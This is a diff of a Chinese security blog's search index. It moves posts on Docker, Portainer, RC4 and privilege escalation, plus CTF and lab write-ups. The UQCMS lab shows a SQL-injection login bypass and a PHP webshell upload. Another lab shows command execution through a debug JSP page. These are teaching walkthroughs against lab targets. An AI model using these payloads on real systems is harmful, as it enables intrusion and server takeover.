@@ -1,48 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Bugku-Web-变量1</title>
-    <url>/post/55589c6e.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、考察方向"><a href="#一、考察方向" class="headerlink" title="一、考察方向"></a>一、考察方向</h1><ul>
-<li>PHP的<code>$GLOBALS</code></li>
-<li>正则表达式</li>
-</ul>
-<h1 id="二、PHP预备知识——-GLOBALS"><a href="#二、PHP预备知识——-GLOBALS" class="headerlink" title="二、PHP预备知识——$GLOBALS"></a>二、PHP预备知识——$GLOBALS</h1><p>&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量</p>
-<p>&emsp;&emsp;<strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
-<p>&emsp;&emsp;<strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
-<p>&emsp;&emsp;<strong>示例：</strong></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#结果</span><br><span class="line">$foo in global scope: Example content</span><br><span class="line">$foo in current scope: local variable</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;注意：</p>
-<ul>
-<li> “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
-<li> <strong>变量可用性</strong>。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。</li>
-</ul>
-<h1 id="三、代码分析"><a href="#三、代码分析" class="headerlink" title="三、代码分析"></a>三、代码分析</h1><p>&emsp;&emsp;页面如下</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="image.png"></p>
-<p>&emsp;&emsp;其中正则表达式<code>/^\w+$/</code>，意思是只能有字母和数字</p>
-<ul>
-<li>两个//表示开始和结束</li>
-<li>^表示开始字符串</li>
-<li>$表示结束字符串</li>
-<li>\w表示包含【a-z，A-Z, _ , 0-9】</li>
-<li>+表示一个或者多个\w</li>
-<li>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </li>
-</ul>
-<h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>&emsp;&emsp;访问<a href="http://114.67.246.176:12610/?args=GLOBALS">http://114.67.246.176:12610/?args=GLOBALS</a>，看到flag</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="image.png"></p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Web</tag>
-        <tag>CTF</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Docker概述</title>
     <url>/post/fb618b33.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、Docker为什么会出现"><a href="#一、Docker为什么会出现" class="headerlink" title="一、Docker为什么会出现"></a>一、Docker为什么会出现</h1><p>&emsp;&emsp;一款产品：开发👉上线 经常需要两套环境！需要对其进行部署应用环境和应用配置。那么就有了开发人员和运维人员</p>
@@ -111,6 +69,48 @@
       </categories>
       <tags>
         <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Bugku-Web-变量1</title>
+    <url>/post/55589c6e.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、考察方向"><a href="#一、考察方向" class="headerlink" title="一、考察方向"></a>一、考察方向</h1><ul>
+<li>PHP的<code>$GLOBALS</code></li>
+<li>正则表达式</li>
+</ul>
+<h1 id="二、PHP预备知识——-GLOBALS"><a href="#二、PHP预备知识——-GLOBALS" class="headerlink" title="二、PHP预备知识——$GLOBALS"></a>二、PHP预备知识——$GLOBALS</h1><p>&emsp;&emsp;其中提示flag在变量中 “flag In the variable !” ，这里要普及一个PHP中特殊的变量</p>
+<p>&emsp;&emsp;<strong>$GLOBALS —— 引用全局作用域中可用的全部变量</strong>。</p>
+<p>&emsp;&emsp;<strong>说明：</strong>一个包含了全部变量的全局组合数组。变量的名字就是数组的键。</p>
+<p>&emsp;&emsp;<strong>示例：</strong></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#示例代码</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$foo</span> = <span class="string">&quot;local variable&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in global scope: &#x27;</span> . <span class="variable">$GLOBALS</span>[<span class="string">&quot;foo&quot;</span>] . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;$foo in current scope: &#x27;</span> . <span class="variable">$foo</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$foo</span> = <span class="string">&quot;Example content&quot;</span>;</span><br><span class="line">test();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#结果</span><br><span class="line">$foo in global scope: Example content</span><br><span class="line">$foo in current scope: local variable</span><br></pre></td></tr></table></figure>
+
+<p>&emsp;&emsp;注意：</p>
+<ul>
+<li> “Superglobal”也称为自动化的全局变量。这就表示其在脚本的所有作用域中都是可用的。不需要在函数或方法中用 <strong>global $variable;</strong> 来访问它。  </li>
+<li> <strong>变量可用性</strong>。与所有其他超全局变量不同，$GLOBALS在PHP中总是可用的。</li>
+</ul>
+<h1 id="三、代码分析"><a href="#三、代码分析" class="headerlink" title="三、代码分析"></a>三、代码分析</h1><p>&emsp;&emsp;页面如下</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632486229240-188bcecb-d4f2-47c2-9b87-a8f58a715bfe.png" alt="image.png"></p>
+<p>&emsp;&emsp;其中正则表达式<code>/^\w+$/</code>，意思是只能有字母和数字</p>
+<ul>
+<li>两个//表示开始和结束</li>
+<li>^表示开始字符串</li>
+<li>$表示结束字符串</li>
+<li>\w表示包含【a-z，A-Z, _ , 0-9】</li>
+<li>+表示一个或者多个\w</li>
+<li>后面的i表示不区分大小写，在此处没用，因为\w里已经包含了大小写。 </li>
+</ul>
+<h1 id="四、解题"><a href="#四、解题" class="headerlink" title="四、解题"></a>四、解题</h1><p>&emsp;&emsp;访问<a href="http://114.67.246.176:12610/?args=GLOBALS">http://114.67.246.176:12610/?args=GLOBALS</a>，看到flag</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1632487926975-c718606e-dab0-4418-9dbf-6e84e2a664a9.png" alt="image.png"></p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Web</tag>
+        <tag>CTF</tag>
       </tags>
   </entry>
   <entry>
@@ -202,14 +202,13 @@
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、提权介绍"><a href="#一、提权介绍" class="headerlink" title="一、提权介绍"></a>一、提权介绍</h1><p>&emsp;&emsp;往往我们能拿下服务器的web服务只是具有低权限用户(www-data)，对于内网渗透，我们需要提权到root。Linux系统的提权过程不止涉及到了漏洞，也涉及了很多系统配置。</p>
 <ul>
 <li><p>提权前提:  </p>
+<ul>
+<li><p>已经拿到低权shell</p>
 </li>
-<li><ul>
-<li>已经拿到低权shell</li>
-<li>被入侵的机器上面有nc，python，perl等linux非常常见的工具</li>
-</ul>
+<li><p>被入侵的机器上面有nc，python，perl等linux非常常见的工具</p>
 </li>
-<li><ul>
-<li>有权限上传文件和下载文件</li>
+<li><p>有权限上传文件和下载文件</p>
+</li>
 </ul>
 </li>
 </ul>
@@ -421,35 +420,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Portainer可视化面板安装</title>
-    <url>/post/2f19e9de.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
-<li>Rancher（CI/CD再用）</li>
-<li>Portainer（先用这个）</li>
-</ul>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=<span class="literal">true</span> portainer/portainer</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span></span><br><span class="line">d93e31b351d5e51dd006ab068e99507ce92185b4b6c8cc5aea6babb0e81b716f</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">d93e31b351d5   portainer/portainer   <span class="string">&quot;/portainer&quot;</span>             7 seconds ago    Up 6 seconds    0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   romantic_kepler</span><br><span class="line">64dc6975f6e4   tomcat                <span class="string">&quot;catalina.sh run&quot;</span>        52 minutes ago   Up 52 minutes   0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp   tomcat01</span><br><span class="line">d0850b4943fc   nginx                 <span class="string">&quot;/docker-entrypoint.…&quot;</span>   15 hours ago     Up 15 hours     0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp       nginx01</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>访问8088端口，创建账户</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377161089-47981bdf-e843-484f-b720-d3018a2d3316.png" alt="img"></p>
-<ul>
-<li>我们选择local即可</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377199498-38faf222-9012-451e-a278-f8e1cc27b6b6.png" alt="img"></p>
-<ul>
-<li>可以管理docker</li>
-</ul>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377258717-90318ccf-2614-450f-b079-782009f9d794.png" alt="img"></p>
-]]></content>
-      <categories>
-        <category>docker</category>
-      </categories>
-      <tags>
-        <tag>docker</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python实现消息轰炸机</title>
     <url>/post/5ab8ed9d.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;解放双手，让电脑来帮我们自动发一些我们想要发的消息，挺省力的，比如说我们想恶搞好朋友，那么我们就可以用脚本来实现自动复制、粘贴和发送文字的功能，从而解放我们自己，不用亲自在电脑上反复干这个<code>Ctrl C</code>/<code>Ctrl V</code>这个累活儿。</p>
@@ -580,6 +550,35 @@
       </tags>
   </entry>
   <entry>
+    <title>Portainer可视化面板安装</title>
+    <url>/post/2f19e9de.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><ul>
+<li>Rancher（CI/CD再用）</li>
+<li>Portainer（先用这个）</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=<span class="literal">true</span> portainer/portainer</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker run -d -p 8088:9000 --restart=always -v /var/run/docker.sock:/var/run/docker.sock --privileged=true portainer/portainer</span></span><br><span class="line">d93e31b351d5e51dd006ab068e99507ce92185b4b6c8cc5aea6babb0e81b716f</span><br><span class="line">[root@VM-0-15-centos ~]<span class="comment"># docker ps</span></span><br><span class="line">CONTAINER ID   IMAGE                 COMMAND                  CREATED          STATUS          PORTS                                       NAMES</span><br><span class="line">d93e31b351d5   portainer/portainer   <span class="string">&quot;/portainer&quot;</span>             7 seconds ago    Up 6 seconds    0.0.0.0:8088-&gt;9000/tcp, :::8088-&gt;9000/tcp   romantic_kepler</span><br><span class="line">64dc6975f6e4   tomcat                <span class="string">&quot;catalina.sh run&quot;</span>        52 minutes ago   Up 52 minutes   0.0.0.0:3355-&gt;8080/tcp, :::3355-&gt;8080/tcp   tomcat01</span><br><span class="line">d0850b4943fc   nginx                 <span class="string">&quot;/docker-entrypoint.…&quot;</span>   15 hours ago     Up 15 hours     0.0.0.0:3344-&gt;80/tcp, :::3344-&gt;80/tcp       nginx01</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>访问8088端口，创建账户</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377161089-47981bdf-e843-484f-b720-d3018a2d3316.png" alt="img"></p>
+<ul>
+<li>我们选择local即可</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377199498-38faf222-9012-451e-a278-f8e1cc27b6b6.png" alt="img"></p>
+<ul>
+<li>可以管理docker</li>
+</ul>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630377258717-90318ccf-2614-450f-b079-782009f9d794.png" alt="img"></p>
+]]></content>
+      <categories>
+        <category>docker</category>
+      </categories>
+      <tags>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>RC4加密算法</title>
     <url>/post/9dd1bdb.html</url>
     <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>&emsp;&emsp;RC4加密算法是一种对称加密算法</p>
@@ -638,6 +637,30 @@
       </categories>
       <tags>
         <tag>密码学</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UQCMS——SQL注入</title>
+    <url>/post/6f0081d7.html</url>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场描述"><a href="#一、靶场描述" class="headerlink" title="一、靶场描述"></a>一、靶场描述</h1><p>&emsp;&emsp;靶场地址：10.1.0.101</p>
+<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>&emsp;&emsp;使用扫描器扫描网站目录，可以扫到一个<strong>adminad.php</strong>的php文件</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986664793-a1588b77-4dd2-4f17-9dd5-37b3fe4d182c.png" alt="img"></p>
+<h1 id="三、漏洞利用——SQL注入"><a href="#三、漏洞利用——SQL注入" class="headerlink" title="三、漏洞利用——SQL注入"></a>三、漏洞利用——SQL注入</h1><p>&emsp;&emsp;用户名：<code>&#39; or 1=1#</code>即可登录后台</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986686036-04afd1ed-fcf3-4ef8-b1bb-296d8c5e4829.png" alt="img"></p>
+<h1 id="四、上传一句话木马"><a href="#四、上传一句话木马" class="headerlink" title="四、上传一句话木马"></a>四、上传一句话木马</h1><p>&emsp;&emsp;对其中任意一个html文件进行修改</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986707074-e20d615c-aa26-4c77-aaea-683c6522c64b.png" alt="img"></p>
+<p>&emsp;&emsp;随便输入一个haha，抓包看看这个包是怎么样的，可以看到POST中content=haha，haha就是我修改的代码，说明content参数是传入代码的；另外还有个path=header.html，发现路径也是提交内容如果设为path=./xdd.php，那么理论上就可以将该文件命名为xdd.php上传提交到当前目录。</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986719240-16df1192-6b4a-467f-a749-d86f3c23467c.png" alt="img"></p>
+<p>&emsp;&emsp;在content一栏中加入一句话木马，并将路径设为xdd.php，放包提交，即可上传一句话木马</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986743427-17bb0651-d554-4be6-99aa-5eb4a9e1ca41.png" alt="img"></p>
+<p>&emsp;&emsp;使用菜刀连接一句话木马即可</p>
+]]></content>
+      <categories>
+        <category>综合靶场</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>UQCMS</tag>
       </tags>
   </entry>
   <entry>
@@ -745,30 +768,6 @@
       <tags>
         <tag>提权</tag>
         <tag>SSH</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>UQCMS——SQL注入</title>
-    <url>/post/6f0081d7.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶场描述"><a href="#一、靶场描述" class="headerlink" title="一、靶场描述"></a>一、靶场描述</h1><p>&emsp;&emsp;靶场地址：10.1.0.101</p>
-<h1 id="二、信息搜集"><a href="#二、信息搜集" class="headerlink" title="二、信息搜集"></a>二、信息搜集</h1><p>&emsp;&emsp;使用扫描器扫描网站目录，可以扫到一个<strong>adminad.php</strong>的php文件</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986664793-a1588b77-4dd2-4f17-9dd5-37b3fe4d182c.png" alt="img"></p>
-<h1 id="三、漏洞利用——SQL注入"><a href="#三、漏洞利用——SQL注入" class="headerlink" title="三、漏洞利用——SQL注入"></a>三、漏洞利用——SQL注入</h1><p>&emsp;&emsp;用户名：<code>&#39; or 1=1#</code>即可登录后台</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986686036-04afd1ed-fcf3-4ef8-b1bb-296d8c5e4829.png" alt="img"></p>
-<h1 id="四、上传一句话木马"><a href="#四、上传一句话木马" class="headerlink" title="四、上传一句话木马"></a>四、上传一句话木马</h1><p>&emsp;&emsp;对其中任意一个html文件进行修改</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986707074-e20d615c-aa26-4c77-aaea-683c6522c64b.png" alt="img"></p>
-<p>&emsp;&emsp;随便输入一个haha，抓包看看这个包是怎么样的，可以看到POST中content=haha，haha就是我修改的代码，说明content参数是传入代码的；另外还有个path=header.html，发现路径也是提交内容如果设为path=./xdd.php，那么理论上就可以将该文件命名为xdd.php上传提交到当前目录。</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986719240-16df1192-6b4a-467f-a749-d86f3c23467c.png" alt="img"></p>
-<p>&emsp;&emsp;在content一栏中加入一句话木马，并将路径设为xdd.php，放包提交，即可上传一句话木马</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627986743427-17bb0651-d554-4be6-99aa-5eb4a9e1ca41.png" alt="img"></p>
-<p>&emsp;&emsp;使用菜刀连接一句话木马即可</p>
-]]></content>
-      <categories>
-        <category>综合靶场</category>
-      </categories>
-      <tags>
-        <tag>SQL注入</tag>
-        <tag>UQCMS</tag>
       </tags>
   </entry>
   <entry>
@@ -940,104 +939,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Web命令执行+SSH</title>
-    <url>/post/bb5c1570.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、靶机说明"><a href="#一、靶机说明" class="headerlink" title="一、靶机说明"></a>一、靶机说明</h1><h2 id="1、下载链接"><a href="#1、下载链接" class="headerlink" title="1、下载链接"></a>1、下载链接</h2><p>&emsp;&emsp;靶场镜像：链接: <a href="https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w">https://pan.baidu.com/s/19k8jz7VARhFW3LYw8U6T9w</a> 提取码: 97qz</p>
-<h2 id="2、靶机准备"><a href="#2、靶机准备" class="headerlink" title="2、靶机准备"></a>2、靶机准备</h2><h3 id="（1）重置靶场密码"><a href="#（1）重置靶场密码" class="headerlink" title="（1）重置靶场密码"></a>（1）重置靶场密码</h3><p>&emsp;&emsp;重启主机，长按shift，进入如下界面后，按e</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887523058-deb5b563-6577-4a58-9b10-b61cf1a64131.png" alt="img"></p>
-<p>&emsp;&emsp;找到linux开头的行，在最后输入 <code>init=/bin/bash</code>，输入完成后按<strong>Crtl+X</strong></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887553506-8fa2221e-2e9e-401e-84d4-facedf386f49.png" alt="img"></p>
-<p>&emsp;&emsp;<code>mount -o rw,remount /</code>，回车</p>
-<p>&emsp;&emsp;<code>    passwd root</code>，输入新密码两次</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887624157-f28ec6e4-9aae-42bd-bd62-54c7c5cad409.png" alt="img"></p>
-<p>&emsp;&emsp;如果提示改变密码成功，重启该虚拟机</p>
-<h3 id="（2）查看IP"><a href="#（2）查看IP" class="headerlink" title="（2）查看IP"></a>（2）查看IP</h3><p>&emsp;&emsp;使用刚才修改的密码进入靶场主机，输入<code>ip a</code>，查看IP地址</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638887754060-4b761873-9c17-4aff-9947-9e1b7da5b83b.png" alt="img"></p>
-<h1 id="二、预备知识"><a href="#二、预备知识" class="headerlink" title="二、预备知识"></a>二、预备知识</h1><p>&emsp;&emsp;使用 <code>ssh 用户名@localhost</code> 通过ssh登录服务器是不需要身份验证的</p>
-<h1 id="三、信息收集"><a href="#三、信息收集" class="headerlink" title="三、信息收集"></a>三、信息收集</h1><h2 id="1、探测主机IP"><a href="#1、探测主机IP" class="headerlink" title="1、探测主机IP"></a>1、探测主机IP</h2><p>&emsp;&emsp;可以使用以下两种方法：arp-scan和netdiscover</p>
-<h3 id="（1）arp-scan"><a href="#（1）arp-scan" class="headerlink" title="（1）arp-scan"></a>（1）arp-scan</h3><p>&emsp;&emsp;使用arp-scan探索靶机IP，发现IP地址为192.168.1.107</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888028567-436c33ce-2113-4b29-82d7-6509f75c0381.png" alt="img"></p>
-<h3 id="（2）netdiscover"><a href="#（2）netdiscover" class="headerlink" title="（2）netdiscover"></a>（2）netdiscover</h3><p>&emsp;&emsp;使用以下命令查看Kali本机IP为192.168.1.108</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ip a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888053910-d470e9e5-c769-4c94-88e9-d57151d282b5.png" alt="img"></p>
-<p>&emsp;&emsp;使用netdiscover命令 <code>netdiscover -r ip/子网掩码</code> 命令来探测靶机</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888190817-8138f7e8-dd3d-4641-9a4c-993c7df0276d.png" alt="img"></p>
-<h2 id="2、开放端口与服务扫描"><a href="#2、开放端口与服务扫描" class="headerlink" title="2、开放端口与服务扫描"></a>2、开放端口与服务扫描</h2><p>&emsp;&emsp;使用nmap对IP进行扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV 192.168.1.107</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;可以看到开放了8080端口，为HTTP服务</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888418264-d4bb0e6e-05d5-4e4f-b80b-9afeeb715300.png" alt="img"></p>
-<p>&emsp;&emsp;访问8080端口，发现是Tomcat建立成功的初始页面</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888484073-cc45897a-36d0-4151-859a-4f3756a7b543.png" alt="img"></p>
-<h2 id="3、目录扫描"><a href="#3、目录扫描" class="headerlink" title="3、目录扫描"></a>3、目录扫描</h2><p>&emsp;&emsp;可以使用dirsearch扫描或者nikto探测</p>
-<h3 id="（1）dirsearch"><a href="#（1）dirsearch" class="headerlink" title="（1）dirsearch"></a>（1）dirsearch</h3><p>&emsp;&emsp;目录扫描：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.1.107:8080</span><br></pre></td></tr></table></figure>
-
-<p>&emsp;&emsp;扫出了个<code>/test.jsp</code></p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1627714481394-793cd585-281c-4c0c-a0dd-100686418c23.png" alt="img"></p>
-<h3 id="（2）nikto"><a href="#（2）nikto" class="headerlink" title="（2）nikto"></a>（2）nikto</h3><p>&emsp;&emsp;使用nikto探测，发现test.jsp可能比较因缺思厅，那么就让我康康！</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888727790-756708be-5ddd-416a-a8d4-ab60f463f87e.png" alt="img"></p>
-<h1 id="四、漏洞探测与利用"><a href="#四、漏洞探测与利用" class="headerlink" title="四、漏洞探测与利用"></a>四、漏洞探测与利用</h1><h2 id="1、漏洞探测——命令执行"><a href="#1、漏洞探测——命令执行" class="headerlink" title="1、漏洞探测——命令执行"></a>1、漏洞探测——命令执行</h2><p>&emsp;&emsp;访问：<code>http://192.168.1.107:8080/test.jsp</code>，出现以下页面，这是一个调试页面，可以用来命令执行</p>
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888844966-6ad86d97-315e-493b-a328-a179d0dc9bf1.png" alt="img"></p>
-<h2 id="2、信息收集"><a href="#2、信息收集" class="headerlink" title="2、信息收集"></a>2、信息收集</h2><p>&emsp;&emsp;查看临时缓冲目录，没什么有用的信息</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -alh /tmp/</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890755332-793e01fb-8db4-45e0-9407-5a6a313b1d98.png" alt="img"></p>
-<p>&emsp;&emsp;查看home目录，挖掘用户信息，发现了bill</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls -la /home</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638888879666-caeef8fc-7376-4eeb-b998-f2dff92a7e57.png" alt="img"></p>
-<p>&emsp;&emsp;查看具体用户bill的目录，我们可以看到具有ssh服务，后续可以使用sudo来拿到root</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ls /home/bill -lah</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638890826401-c5969405-0a1d-4bf2-9786-41da55dd1b9a.png" alt="img"></p>
-<p>&emsp;&emsp;查看系统信息，为ubuntu系统</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">uname -a</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1638891176526-0aa76660-1b06-4f13-b9b7-0255c9e0477f.png" alt="img"></p>
-<p>&emsp;&emsp;查看用户bill在主机上可以使用和禁止的命令，没什么有用的信息</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh bill@localhost sudo -l</span><br></pre></td></tr></table></figure>
-
